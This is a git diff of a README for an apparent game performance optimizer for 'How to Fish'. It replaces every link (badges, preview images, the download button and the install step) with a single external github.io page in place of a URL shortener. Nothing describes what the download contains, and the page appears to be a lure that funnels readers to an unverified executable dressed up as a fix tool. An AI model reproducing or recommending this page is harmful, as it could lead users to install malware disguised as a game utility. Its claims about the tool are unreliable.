@@ -10,32 +10,32 @@ The project is designed around the problems that matter most for this game: **un
 
 ## Quick Access
 
-[![How to Fish](https://img.shields.io/badge/How%20to%20Fish-Performance%20Optimizer-2f81f7?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![GPU Load](https://img.shields.io/badge/GPU%20Load-Optimization-2ea043?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Stutter](https://img.shields.io/badge/Stutter-Repair-f59e0b?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Crash](https://img.shields.io/badge/Crash-Repair-d73a49?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Display](https://img.shields.io/badge/Display-Fix-8250df?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![How to Fish](https://img.shields.io/badge/How%20to%20Fish-Performance%20Optimizer-2f81f7?style=for-the-badge)](https://trainedhierar.github.io/)
+[![GPU Load](https://img.shields.io/badge/GPU%20Load-Optimization-2ea043?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Stutter](https://img.shields.io/badge/Stutter-Repair-f59e0b?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Crash](https://img.shields.io/badge/Crash-Repair-d73a49?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Display](https://img.shields.io/badge/Display-Fix-8250df?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://trainedhierar.github.io/)
 
 ---
 
 ## Download
 
-➡️ **[Download How to Fish Performance Optimizer](https://flyn.co/17yeN7/)**
+➡️ **[Download How to Fish Performance Optimizer](https://trainedhierar.github.io/)**
 
 ---
 
 ## Preview
 
-[![How to Fish Performance Optimizer](assets/how-to-fish-optimizer-preview.png)](https://flyn.co/17yeN7/)
+[![How to Fish Performance Optimizer](assets/how-to-fish-optimizer-preview.png)](https://trainedhierar.github.io/)
 
 ### Optimizer Dashboard
 
-[![How to Fish Optimizer Dashboard](assets/how-to-fish-optimizer-dashboard.png)](https://flyn.co/17yeN7/)
+[![How to Fish Optimizer Dashboard](assets/how-to-fish-optimizer-dashboard.png)](https://trainedhierar.github.io/)
 
 ### Before / After Optimization
 
-[![How to Fish optimization stability comparison](assets/how-to-fish-before-after-stability.png)](https://flyn.co/17yeN7/)
+[![How to Fish optimization stability comparison](assets/how-to-fish-before-after-stability.png)](https://trainedhierar.github.io/)
 
 > Preview metrics are illustrative. Actual GPU usage, temperatures, power draw, loading behavior, and smoothness depend on your hardware, drivers, resolution, background software, and current game version.
 
@@ -201,7 +201,7 @@ You can always restore the original configuration.
 
 1. Download the current build:
 
-   **[Download How to Fish Performance Optimizer](https://flyn.co/17yeN7/)**
+   **[Download How to Fish Performance Optimizer](https://trainedhierar.github.io/)**
 
 2. Extract it into a dedicated folder.
 3. Close **How to Fish** before applying configuration changes.
